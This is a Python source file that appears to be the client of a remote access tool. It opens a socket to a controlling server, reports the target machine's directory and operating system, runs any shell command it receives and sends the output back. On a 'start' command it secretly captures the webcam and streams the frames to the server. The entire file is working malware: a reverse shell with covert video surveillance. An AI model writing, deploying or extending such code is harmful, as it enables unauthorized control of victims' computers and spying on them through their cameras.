import socket # For network (client-server) communication.
import os # For handling os executions.
import subprocess # For executing system commands.
import cv2 # For recording the video.
import threading # For recording the video in a different thread.
import platform # We use this to get the os of the target (client).

SERVER_HOST = "127.0.0.1" # Server's IP address
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.

# Separator string for sending 2 messages at a time.
SEPARATOR = "<sep>"

# Create the socket object.
s = socket.socket()
# Connect to the server.
s.connect((SERVER_HOST, SERVER_PORT))

# Get the current directory and os and send it to the server.
cwd = os.getcwd()
targets_os = platform.system()
s.send(cwd.encode())
s.send(targets_os.encode())

# Function to record and send the video.
def record_video():
    global cap
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

while True:
    # receive the command from the server.
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop.
        break
    elif command.lower() == "start":
        # Start recording video in a separate thread
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    else:
        # execute the command and retrieve the results.
        output = subprocess.getoutput(command)
        # get the current working directory as output.
        cwd = os.getcwd()
        # send the results back to the server.
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

# close client connection.
s.close()